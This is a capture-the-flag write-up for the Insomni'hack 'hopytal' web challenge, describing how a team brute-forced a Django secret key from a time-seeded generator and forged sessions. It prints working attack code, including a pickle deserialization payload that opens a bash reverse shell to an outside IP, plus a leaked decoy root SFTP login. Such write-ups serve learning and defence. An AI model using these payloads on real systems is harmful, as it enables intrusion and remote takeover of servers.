# hopytal

Do you like guessing? Love, even? Oh boy, do I have a challenge for you.

> This random secret key generator is used to sign covid certificates issued from the Hopytal laboratory. 
>
> Its behavior seems strange.. the alphabet must be printable.
>
> Valid 2G+ certificates may be  present on the server.
>
> Dirbusting is not needed to solve the challenge.

### 1. Key generator

First, you have to **guess** the algorithm used by the random
key generator. After trying and failing multiple times,
we guessed correctly:

```python
def deterministic_key(seed):
    CHARSET = string.digits + string.ascii_lowercase + string.ascii_uppercase + string.punctuation

    random.seed(seed)
    out = ""
    for i in range(50):
        out += random.choice(CHARSET)
    return out
```

There's nothing to suggest this in the description or on the webpage, so it was a long shot.

### 2. Django secret

Now, you have to **guess** that the django secret was generated
using the same brokem algorithm. But how to check it?

You can get a valid session ID by going to
`http://hopytal.insomnihack.ch/accounts/login/?next=/login` with invalid sessionid (Why? I don't know, it was discovered by web people).

```python
def get_session_id():
    r = requests.get("http://hopytal.insomnihack.ch/accounts/login/?next=/login", cookies={"sessionid":"asdasdasdasd"})
    o = r.cookies["sessionid"]
    return o
```

This will give a session ID like

```
gAUplC4:1nDwUa:bGjgxwu5sOyd8CZWX0jbejGIXjxylHQjQELbXWvoFf4
```

Of course with this you can also check if you have a valid secret,
using django's unsigner:

```python
def unsign(payload, key):
    key = force_bytes(key)

    salt = 'django.contrib.sessions.backends.signed_cookies'
    try:
        TimestampSigner(key=key,salt=salt, algorithm='sha256').unsign(payload, max_age=200000000)
        return True
    except BadSignature as e:
        return False
```

Finally you can combine this and brute-force the secret:

```python

SEED = int(time.time())
sid = get_session_id()
print(sid)

while True:
    SEED = SEED - 1
    if SEED % 1000 == 0:
        print(datetime.datetime.fromtimestamp(SEED))
    key = deterministic_key(SEED)
    if SEED % 1000 == 0:
        print(rrr)
    if unsign(sid, key):
        print(key, sid, unsign(sid, key))
        break
```

Warning - this will take a long time. Instead of brute-forcing 
maybe 2-3 days, I was close to giving up after 6 months.
Fortunately, one of our teammembers guessed that since

> This random secret key generator is used to sign covid certificates issued from the Hopytal laboratory. 

We should bruteforce on the day of first COVID case in Switzerland.
Yeah, that worked. For seed 1582585200 (Monday, February 24, 2020 23:00:00). The secret key is:

```
^vAmq'D*[i3,J+5S(XCUDd2yLlE<5tgtDY$$fVAl.}!sSocr8}
```

### 3. RCE

Now I'll save us some embarassment and won't describe the incorrect
guesses we made here.

Instead, we finally ~~observed~~ **guessed** that django uses
non-default serialisation engine:

```
>>> session_id = "gAV9lC4:1nDwjx:VyNh0cUKcNH49UZd6a_ePSAyGGm274XHwKqvHMCti7g"
>>> session_data = base64.b64decode("gAV9lC4==")
>>> pickle.loads(session_data)
{}
```

Yeah, pickle.

So we get a RCE with some nice python object:


```python
class RCE:
    def __reduce__(self):
        cmd = ('/bin/bash -c \'/bin/bash -i >& /dev/tcp/12.93.211.51/4446 0>&1\'')
        return os.system, (cmd,)

pickled = pickle.dumps(RCE())
```

And... No, that's not over yet.

### 4. Where is the flag

Because now you have to **guess** where the flag is.

And the server had almost no binaries. Only bash and python.

So first, we had to upload a statically `busybox` (with python) and
chmod it (with python).

Then we downloaded the application source code, but there was
literally nothing interesting in there.

Then the server crashed for everyone (there was only one server,
and it was shared with everyone, and the challenge had RCE).

Then we found a file `/home/http_service/covidcert_2g+.pdf`, but had
no permission to read it (and no way to escalate).

Then we found a SFTP config
```
    "host": "172.21.2.105", 
    "user": "root",
    "password": "Pass.123", 
    "port": "22",
```
and after wasting a lot of time trying to connect there with
busybox, it turned out to be a false flag.

Then we found a flag `INS{yOu_g0t_th3_piCkl3}` in a random file in `/tmp`,
and it turned out to be a troll/joke by some other team
(the infra was shared).

Than we guessed, that maybe there'ss another internal network 
service that listens only on 127.0.0.1:

```
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      6469/dropbearmulti
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      4794/dropbearmulti
tcp        0      0 127.0.0.1:8087          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN      13/python
```

Yeah, that port 8087 is sus. We just uploded a statically compiled curl and...

```
/tmp/curl localhost:8087
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>Directory listing for /</title>
</head>
<body>
<h1>Directory listing for /</h1>
<hr>
<ul>
<li><a href=".bash_logout">.bash_logout</a></li>
<li><a href=".bashrc">.bashrc</a></li>
<li><a href=".profile">.profile</a></li>
<li><a href="covidcert_2g%2B.pdf">covidcert_2g+.pdf</a></li>
<li><a href="http.sh">http.sh</a></li>
</ul>
<hr>
</body>
```

And finally:

```
$ /tmp/curl localhost:8087/covidcert_2g%2B.pdf
/tmp/curl localhost:8087/covidcert_2g%2B.pdf
INS{I_4m_Pickl3_R1ck!_4nD_h3r3_1s_Ur_2G+_c0v1d_C3rT}
```

#### Parting thoughts

I have no idea, why this had to be so complicated. The first step
was pure clairvoyance, and a few last steps was just burning time.

But what do I know, usually I work on RE or Crypto. Webs
are just not my favourite category,

**I guess**.